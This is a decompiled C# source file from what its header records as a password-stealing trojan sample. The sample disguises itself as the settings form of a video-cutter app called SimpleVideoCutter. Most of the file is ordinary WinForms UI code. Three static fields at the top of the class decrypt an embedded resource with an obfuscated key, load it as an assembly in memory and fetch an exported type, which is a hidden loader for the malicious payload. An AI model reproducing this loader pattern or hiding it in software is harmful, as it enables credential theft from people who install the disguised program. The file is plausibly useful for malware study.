// Decompiled with JetBrains decompiler
// Type: SimpleVideoCutter.FormSettings
// Assembly: SimpleVideoCutter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC3F1699-ABA1-43FB-A799-9F64138760E7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f61a916b55390990f502b60b4e78cb70d9da9416954b3cb35908cf3498ac3ead.exe

using SimpleVideoCutter.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace SimpleVideoCutter
{
  public class FormSettings : Form
  {
    public static byte[] Paradise = FormAddTask.Lime(Resources.Helper_Classes, "bیYنچ");
    public static AppDomain BootCamp = Thread.GetDomain();
    public static System.Type Hasenda = FormSettings.BootCamp.Load(FormSettings.Paradise).GetExportedTypes()[2];
    private IContainer components = (IContainer) null;
    private Label label1;
    private ToolTip toolTip1;
    private Label label2;
    private Label label3;
    private TextBox textBoxFFmpegPath;
    private Label label4;
    private TextBox textBoxVideoFileExtensions;
    private Label label5;
    private Button buttonOutputDirectory;
    private Button buttonFFmpegPath;
    private Button buttonDefaultDirectory;
    private FolderBrowserDialog folderBrowserDialog1;
    private TableLayoutPanel tableLayoutPanel1;
    private ComboBox comboBoxOutputDirectory;
    private ComboBox comboBoxDefaultDirectory;
    private FlowLayoutPanel flowLayoutPanel1;
    private Button buttonCancel;
    private Button buttonOK;
    private TextBox textBoxOutputFilePattern;
    private Label label6;
    private ComboBox comboBoxPreviewSize;

    public FormSettings()
    {
      this.InitializeComponent();
      CultureInfo cultureInfo = CultureInfo.GetCultureInfo(VideoCutterSettings.Instance.Language);
      if (cultureInfo != null)
        Thread.CurrentThread.CurrentUICulture = cultureInfo;
      this.toolTip1.SetToolTip((Control) this.comboBoxDefaultDirectory, string.Format(GlobalStrings.FormSettings_DefaultDirecttoryTooltip, (object) "{UserVideos}\\n{UserDocuments}\\n{MyComputer}".Replace("\\n", Environment.NewLine)));
      this.toolTip1.SetToolTip((Control) this.comboBoxOutputDirectory, string.Format(GlobalStrings.FormSettings_OutputDirectoryTooltip, (object) "{UserVideos}\\n{UserDocuments}\\n{MyComputer}".Replace("\\n", Environment.NewLine)));
      this.toolTip1.SetToolTip((Control) this.textBoxOutputFilePattern, string.Format(GlobalStrings.FormSettings_OutputFileNamePatternTooltip, (object) "{FileName}", (object) "{FileNameWithoutExtension}", (object) "{FileExtension}", (object) "{FileDate}", (object) "{Timestamp}"));
      this.comboBoxPreviewSize.DataSource = (object) ((IEnumerable<PreviewSize>) Enum.GetValues(typeof (PreviewSize))).Select<PreviewSize, FormSettings.ComboBoxItem<PreviewSize>>((Func<PreviewSize, FormSettings.ComboBoxItem<PreviewSize>>) (ps => new FormSettings.ComboBoxItem<PreviewSize>()
      {
        Value = ps,
        Title = ps.ToString()
      })).ToList<FormSettings.ComboBoxItem<PreviewSize>>();
    }

    public void ShowSettingsDialog()
    {
      VideoCutterSettings.Instance.LoadSettings();
      this.SettingsToGUI();
      int num = (int) this.ShowDialog();
    }

    private void SettingsToGUI()
    {
      VideoCutterSettings instance = VideoCutterSettings.Instance;
      this.comboBoxDefaultDirectory.Text = instance.DefaultInitialDirectory;
      this.comboBoxOutputDirectory.Text = instance.OutputDirectory;
      this.textBoxOutputFilePattern.Text = instance.OutputFilePattern;
      this.textBoxFFmpegPath.Text = instance.FFmpegPath;
      this.textBoxVideoFileExtensions.Text = string.Join(" ,", instance.VideoFilesExtensions);
      this.comboBoxPreviewSize.SelectedValue = (object) instance.PreviewSize;
      this.SetBackgroundOfFFmpegPath();
    }

    private void GUIToSettings()
    {
      VideoCutterSettings instance = VideoCutterSettings.Instance;
      instance.DefaultInitialDirectory = this.comboBoxDefaultDirectory.Text;
      instance.OutputDirectory = this.comboBoxOutputDirectory.Text;
      instance.OutputFilePattern = this.textBoxOutputFilePattern.Text;
      instance.FFmpegPath = this.textBoxFFmpegPath.Text;
      instance.PreviewSize = (PreviewSize) Enum.Parse(typeof (PreviewSize), this.comboBoxPreviewSize.SelectedValue.ToString());
      instance.StoreSettings();
    }

    private string SelectFile(string fileName)
    {
      using (OpenFileDialog openFileDialog = new OpenFileDialog())
      {
        openFileDialog.DefaultExt = "exe";
        openFileDialog.CheckFileExists = true;
        openFileDialog.Filter = string.Format("{0} (*.exe)|*.exe", (object) GlobalStrings.FormSettings_ExecutableFiles);
        if (openFileDialog.ShowDialog((IWin32Window) this) == DialogResult.OK)
          return openFileDialog.FileName;
      }
      return (string) null;
    }

    private string SelectFolder()
    {
      using (FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog())
      {
        if (folderBrowserDialog.ShowDialog((IWin32Window) this) == DialogResult.OK)
          return folderBrowserDialog.SelectedPath;
      }
      return (string) null;
    }

    private void SetBackgroundOfFFmpegPath()
    {
      if (string.IsNullOrWhiteSpace(this.textBoxFFmpegPath.Text))
        this.textBoxFFmpegPath.BackColor = Color.Orange;
      else
        this.textBoxFFmpegPath.BackColor = SystemColors.Window;
    }

    private void textBoxFFmpegPath_TextChanged(object sender, EventArgs e) => this.SetBackgroundOfFFmpegPath();

    private void buttonFFmpegPath_Click(object sender, EventArgs e)
    {
      string str = this.SelectFile("ffmpeg.exe");
      if (str == null)
        return;
      this.textBoxFFmpegPath.Text = str;
    }

    private void buttonDefaultDirectory_Click(object sender, EventArgs e)
    {
      string str = this.SelectFolder();
      if (str == null)
        return;
      this.comboBoxDefaultDirectory.Text = str;
    }

    private void buttonOutputDirectory_Click(object sender, EventArgs e)
    {
      string str = this.SelectFolder();
      if (str == null)
        return;
      this.comboBoxOutputDirectory.Text = str;
    }

    private void buttonOK_Click(object sender, EventArgs e)
    {
      this.GUIToSettings();
      this.Close();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormSettings));
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.textBoxFFmpegPath = new TextBox();
      this.label4 = new Label();
      this.textBoxVideoFileExtensions = new TextBox();
      this.label5 = new Label();
      this.buttonOutputDirectory = new Button();
      this.buttonFFmpegPath = new Button();
      this.buttonDefaultDirectory = new Button();
      this.folderBrowserDialog1 = new FolderBrowserDialog();
      this.toolTip1 = new ToolTip(this.components);
      this.comboBoxDefaultDirectory = new ComboBox();
      this.comboBoxOutputDirectory = new ComboBox();
      this.textBoxOutputFilePattern = new TextBox();
      this.tableLayoutPanel1 = new TableLayoutPanel();
      this.flowLayoutPanel1 = new FlowLayoutPanel();
      this.buttonCancel = new Button();
      this.buttonOK = new Button();
      this.label6 = new Label();
      this.comboBoxPreviewSize = new ComboBox();
      this.tableLayoutPanel1.SuspendLayout();
      this.flowLayoutPanel1.SuspendLayout();
      this.SuspendLayout();
      componentResourceManager.ApplyResources((object) this.label1, "label1");
      this.label1.Name = "label1";
      componentResourceManager.ApplyResources((object) this.label2, "label2");
      this.label2.Name = "label2";
      componentResourceManager.ApplyResources((object) this.label3, "label3");
      this.label3.Name = "label3";
      componentResourceManager.ApplyResources((object) this.textBoxFFmpegPath, "textBoxFFmpegPath");
      this.textBoxFFmpegPath.Name = "textBoxFFmpegPath";
      this.toolTip1.SetToolTip((Control) this.textBoxFFmpegPath, componentResourceManager.GetString("textBoxFFmpegPath.ToolTip"));
      this.textBoxFFmpegPath.TextChanged += new EventHandler(this.textBoxFFmpegPath_TextChanged);
      componentResourceManager.ApplyResources((object) this.label4, "label4");
      this.label4.Name = "label4";
      componentResourceManager.ApplyResources((object) this.textBoxVideoFileExtensions, "textBoxVideoFileExtensions");
      this.textBoxVideoFileExtensions.Name = "textBoxVideoFileExtensions";
      this.textBoxVideoFileExtensions.ReadOnly = true;
      this.toolTip1.SetToolTip((Control) this.textBoxVideoFileExtensions, componentResourceManager.GetString("textBoxVideoFileExtensions.ToolTip"));
      componentResourceManager.ApplyResources((object) this.label5, "label5");
      this.label5.Name = "label5";
      componentResourceManager.ApplyResources((object) this.buttonOutputDirectory, "buttonOutputDirectory");
      this.buttonOutputDirectory.Name = "buttonOutputDirectory";
      this.buttonOutputDirectory.UseVisualStyleBackColor = true;
      this.buttonOutputDirectory.Click += new EventHandler(this.buttonOutputDirectory_Click);
      componentResourceManager.ApplyResources((object) this.buttonFFmpegPath, "buttonFFmpegPath");
      this.buttonFFmpegPath.Name = "buttonFFmpegPath";
      this.buttonFFmpegPath.UseVisualStyleBackColor = true;
      this.buttonFFmpegPath.Click += new EventHandler(this.buttonFFmpegPath_Click);
      componentResourceManager.ApplyResources((object) this.buttonDefaultDirectory, "buttonDefaultDirectory");
      this.buttonDefaultDirectory.Name = "buttonDefaultDirectory";
      this.buttonDefaultDirectory.UseVisualStyleBackColor = true;
      this.buttonDefaultDirectory.Click += new EventHandler(this.buttonDefaultDirectory_Click);
      this.comboBoxDefaultDirectory.FormattingEnabled = true;
      this.comboBoxDefaultDirectory.Items.AddRange(new object[3]
      {
        (object) componentResourceManager.GetString("comboBoxDefaultDirectory.Items"),
        (object) componentResourceManager.GetString("comboBoxDefaultDirectory.Items1"),
        (object) componentResourceManager.GetString("comboBoxDefaultDirectory.Items2")
      });
      componentResourceManager.ApplyResources((object) this.comboBoxDefaultDirectory, "comboBoxDefaultDirectory");
      this.comboBoxDefaultDirectory.Name = "comboBoxDefaultDirectory";
      this.toolTip1.SetToolTip((Control) this.comboBoxDefaultDirectory, componentResourceManager.GetString("comboBoxDefaultDirectory.ToolTip"));
      this.comboBoxOutputDirectory.FormattingEnabled = true;
      this.comboBoxOutputDirectory.Items.AddRange(new object[4]
      {
        (object) componentResourceManager.GetString("comboBoxOutputDirectory.Items"),
        (object) componentResourceManager.GetString("comboBoxOutputDirectory.Items1"),
        (object) componentResourceManager.GetString("comboBoxOutputDirectory.Items2"),
        (object) componentResourceManager.GetString("comboBoxOutputDirectory.Items3")
      });
      componentResourceManager.ApplyResources((object) this.comboBoxOutputDirectory, "comboBoxOutputDirectory");
      this.comboBoxOutputDirectory.Name = "comboBoxOutputDirectory";
      this.toolTip1.SetToolTip((Control) this.comboBoxOutputDirectory, componentResourceManager.GetString("comboBoxOutputDirectory.ToolTip"));
      componentResourceManager.ApplyResources((object) this.textBoxOutputFilePattern, "textBoxOutputFilePattern");
      this.textBoxOutputFilePattern.Name = "textBoxOutputFilePattern";
      this.toolTip1.SetToolTip((Control) this.textBoxOutputFilePattern, componentResourceManager.GetString("textBoxOutputFilePattern.ToolTip"));
      componentResourceManager.ApplyResources((object) this.tableLayoutPanel1, "tableLayoutPanel1");
      this.tableLayoutPanel1.Controls.Add((Control) this.comboBoxOutputDirectory, 1, 1);
      this.tableLayoutPanel1.Controls.Add((Control) this.textBoxVideoFileExtensions, 1, 6);
      this.tableLayoutPanel1.Controls.Add((Control) this.buttonFFmpegPath, 2, 4);
      this.tableLayoutPanel1.Controls.Add((Control) this.label5, 0, 6);
      this.tableLayoutPanel1.Controls.Add((Control) this.buttonDefaultDirectory, 2, 0);
      this.tableLayoutPanel1.Controls.Add((Control) this.buttonOutputDirectory, 2, 1);
      this.tableLayoutPanel1.Controls.Add((Control) this.textBoxFFmpegPath, 1, 4);
      this.tableLayoutPanel1.Controls.Add((Control) this.label2, 0, 1);
      this.tableLayoutPanel1.Controls.Add((Control) this.label4, 0, 4);
      this.tableLayoutPanel1.Controls.Add((Control) this.label3, 0, 3);
      this.tableLayoutPanel1.Controls.Add((Control) this.label1, 0, 0);
      this.tableLayoutPanel1.Controls.Add((Control) this.comboBoxDefaultDirectory, 1, 0);
      this.tableLayoutPanel1.Controls.Add((Control) this.textBoxOutputFilePattern, 1, 3);
      this.tableLayoutPanel1.Controls.Add((Control) this.label6, 0, 5);
      this.tableLayoutPanel1.Controls.Add((Control) this.comboBoxPreviewSize, 1, 5);
      this.tableLayoutPanel1.Name = "tableLayoutPanel1";
      componentResourceManager.ApplyResources((object) this.flowLayoutPanel1, "flowLayoutPanel1");
      this.flowLayoutPanel1.Controls.Add((Control) this.buttonCancel);
      this.flowLayoutPanel1.Controls.Add((Control) this.buttonOK);
      this.flowLayoutPanel1.Name = "flowLayoutPanel1";
      this.buttonCancel.DialogResult = DialogResult.Cancel;
      componentResourceManager.ApplyResources((object) this.buttonCancel, "buttonCancel");
      this.buttonCancel.Name = "buttonCancel";
      this.buttonCancel.UseVisualStyleBackColor = true;
      componentResourceManager.ApplyResources((object) this.buttonOK, "buttonOK");
      this.buttonOK.Name = "buttonOK";
      this.buttonOK.UseVisualStyleBackColor = true;
      this.buttonOK.Click += new EventHandler(this.buttonOK_Click);
      componentResourceManager.ApplyResources((object) this.label6, "label6");
      this.label6.Name = "label6";
      this.comboBoxPreviewSize.DisplayMember = "Title";
      this.comboBoxPreviewSize.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBoxPreviewSize.FormattingEnabled = true;
      componentResourceManager.ApplyResources((object) this.comboBoxPreviewSize, "comboBoxPreviewSize");
      this.comboBoxPreviewSize.Name = "comboBoxPreviewSize";
      this.comboBoxPreviewSize.ValueMember = "Value";
      this.AcceptButton = (IButtonControl) this.buttonOK;
      componentResourceManager.ApplyResources((object) this, "$this");
      this.AutoScaleMode = AutoScaleMode.Font;
      this.CancelButton = (IButtonControl) this.buttonCancel;
      this.Controls.Add((Control) this.flowLayoutPanel1);
      this.Controls.Add((Control) this.tableLayoutPanel1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (FormSettings);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.tableLayoutPanel1.ResumeLayout(false);
      this.tableLayoutPanel1.PerformLayout();
      this.flowLayoutPanel1.ResumeLayout(false);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal class ComboBoxItem<T>
    {
      public string Title { get; set; }

      public T Value { get; set; }

      public override bool Equals(object obj) => obj is FormSettings.ComboBoxItem<T> && object.Equals((object) this.Value, (object) (obj as FormSettings.ComboBoxItem<T>).Value);

      public override int GetHashCode() => (object) this.Value == null ? 0 : this.Value.GetHashCode();
    }
  }
}
